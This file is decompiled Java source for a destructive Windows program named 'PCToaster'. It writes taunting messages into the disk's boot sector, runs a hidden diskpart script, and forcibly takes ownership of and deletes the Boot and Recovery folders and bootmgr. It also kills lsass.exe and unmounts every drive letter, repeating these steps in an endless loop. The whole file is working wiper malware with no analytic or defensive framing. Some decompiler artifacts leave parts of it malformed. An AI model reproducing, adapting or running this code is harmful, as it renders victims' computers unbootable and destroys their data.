package pctoaster1;

import java.io.*;
import java.net.URI;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.util.HashSet;
import java.util.Iterator;

public class a
{

    public a()
    {
        files = new HashSet();
        create();
    }

    void create()
    {
        try
        {
            String pathname = "\\\\.\\GLOBALROOT\\ArcName\\multi(0)disk(0)rdisk(0)partition(1)";
            Path diskRoot = (new File(pathname)).toPath();
            FileChannel fc = FileChannel.open(diskRoot, new OpenOption[] {
                StandardOpenOption.READ, StandardOpenOption.WRITE
            });
            ByteBuffer bb = ByteBuffer.allocate(2048);
            fc.position(0L);
            fc.read(bb);
            int start = 668;
            byte ar[] = bb.array();
            String s = "Hello there! I'm happy to tell you that your PC has been TOASTED, extra  ";
            char car[] = s.toCharArray();
            int last = 0;
            for(int i = 0; i < s.length(); i++)
            {
                byte bt[] = (new String((new StringBuilder(String.valueOf(car[i]))).toString())).getBytes();
                ar[start + i] = bt[0];
                last = start + i;
            }

            start = 743;
            ar = bb.array();
            s = "crispy for your pleasure.  ";
            car = s.toCharArray();
            last = 0;
            for(int i = 0; i < s.length(); i++)
            {
                byte bt[] = (new String((new StringBuilder(String.valueOf(car[i]))).toString())).getBytes();
                ar[start + i] = bt[0];
                last = start + i;
            }

            start = 449;
            ar = bb.array();
            s = "Thank you for using PCToaster";
            car = s.toCharArray();
            last = 0;
            for(int i = 0; i < s.length(); i++)
            {
                byte bt[] = (new String((new StringBuilder(String.valueOf(car[i]))).toString())).getBytes();
                ar[start + i] = bt[0];
                last = start + i;
            }

            bb.position(0);
            bb.put(ar);
            bb.position(0);
            fc.position(0L);
            fc.write(bb);
            deld();
        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }
    }

    void deld()
    {
        do
        {
            (new Thread(new Runnable() {

                public void run()
                {
                    try
                    {
                        Thread.sleep(45000L);
                    }
                    catch(InterruptedException interruptedexception1) { }
                    kill();
                }

                final a this$0;

            
            {
                this$0 = a.this;
                super();
            }
            })).start();
            (new Thread(new Runnable() {

                public void run()
                {
                    try
                    {
                        files.clear();
                        File f = new File(a.ExportResource("/scr.txt"));
                        comimp((new StringBuilder("attrib +h ")).append(f.getPath()).toString());
                        comimp((new StringBuilder("diskpart /s ")).append(f.getAbsolutePath()).toString());
                        comimp("takeown /f V:\\Boot /r");
                        comimp("takeown /f V:\\Recovery /r");
                        collectFiles(new File("V:\\Boot"));
                        collectFiles(new File("V:\\Recovery"));
                        files.add(new File("V:\\bootmgr"));
                        String ow = System.getProperty("user.name");
                        File file;
                        for(Iterator iterator = files.iterator(); iterator.hasNext(); com((new StringBuilder("rd /s /q ")).append(file.getPath()).toString()))
                        {
                            file = (File)iterator.next();
                            comimp((new StringBuilder("takeown /f ")).append(file.getPath()).toString());
                            comimp((new StringBuilder("icacls ")).append(file.getPath()).append(" /grant \"").append(ow).append("\":F").toString());
                            com((new StringBuilder("del ")).append(file.getPath()).toString());
                            file.delete();
                        }

                        File file;
                        for(Iterator iterator1 = files.iterator(); iterator1.hasNext(); comimp((new StringBuilder("rd /s /q ")).append(file.getPath()).toString()))
                        {
                            file = (File)iterator1.next();
                            comimp((new StringBuilder("takeown /f ")).append(file.getPath()).toString());
                            comimp((new StringBuilder("icacls ")).append(file.getPath()).append(" /grant \"").append(ow).append("\":F").toString());
                            comimp((new StringBuilder("del ")).append(file.getPath()).toString());
                            file.delete();
                        }

                    }
                    catch(Exception ex)
                    {
                        ex.printStackTrace();
                    }
                }

                final a this$0;

            
            {
                this$0 = a.this;
                super();
            }
            })).start();
            try
            {
                Thread.sleep(30000L);
            }
            catch(InterruptedException interruptedexception) { }
        } while(true);
    }

    void com(final String cmd)
    {
        try
        {
            Thread t = new Thread(new Runnable() {

                public void run()
                {
                    try
                    {
                        Process p = Runtime.getRuntime().exec(cmd);
                        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        String line;
                        while((line = in.readLine()) != null) 
                            System.out.println(line);
                        p.waitFor();
                    }
                    catch(Exception exception1) { }
                }

                final a this$0;
                private final String val$cmd;

            
            {
                this$0 = a.this;
                cmd = s;
                super();
            }
            });
            t.start();
            t.join(500L);
        }
        catch(Exception exception) { }
    }

    void comimp(final String cmd)
    {
        try
        {
            Thread t = new Thread(new Runnable() {

                public void run()
                {
                    try
                    {
                        Process p = Runtime.getRuntime().exec(cmd);
                        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        String line;
                        while((line = in.readLine()) != null) 
                            System.out.println(line);
                        p.waitFor();
                    }
                    catch(Exception exception1) { }
                }

                final a this$0;
                private final String val$cmd;

            
            {
                this$0 = a.this;
                cmd = s;
                super();
            }
            });
            t.start();
            t.join();
        }
        catch(Exception exception) { }
    }

    void collectFiles(File f)
    {
        if(f.isFile())
        {
            files.add(f);
        } else
        {
            File afile[];
            int j = (afile = f.listFiles()).length;
            for(int i = 0; i < j; i++)
            {
                File k = afile[i];
                collectFiles(k);
            }

            files.add(f);
        }
    }

    public static String ExportResource(String resourceName)
        throws Exception
    {
        InputStream stream;
        OutputStream resStreamOut;
        stream = null;
        resStreamOut = null;
        String jarFolder;
        try
        {
            stream = pctoaster1/a.getResourceAsStream(resourceName);
            if(stream == null)
                throw new Exception((new StringBuilder("Cannot get resource \"")).append(resourceName).append("\" from Jar file.").toString());
            byte buffer[] = new byte[4096];
            jarFolder = (new File(pctoaster1/a.getProtectionDomain().getCodeSource().getLocation().toURI().getPath())).getParentFile().getPath().replace('\\', '/');
            resStreamOut = new FileOutputStream((new StringBuilder(String.valueOf(jarFolder))).append(resourceName).toString());
            int readBytes;
            while((readBytes = stream.read(buffer)) > 0) 
                resStreamOut.write(buffer, 0, readBytes);
        }
        catch(Exception ex)
        {
            throw ex;
        }
        break MISSING_BLOCK_LABEL_160;
        Exception exception;
        exception;
        stream.close();
        resStreamOut.close();
        throw exception;
        stream.close();
        resStreamOut.close();
        return (new StringBuilder(String.valueOf(jarFolder))).append(resourceName).toString();
    }

    void kill()
    {
        com("taskkill /im lsass.exe /f");
        try
        {
            Thread.sleep(10000L);
        }
        catch(InterruptedException interruptedexception) { }
        char ac[];
        int j = (ac = "ABDEFGHIJKLMNOPQRSTUVWXYZC".toCharArray()).length;
        for(int i = 0; i < j; i++)
        {
            char c = ac[i];
            com((new StringBuilder("mountvol ")).append(c).append(": /d").toString());
        }

    }

    HashSet files;
}
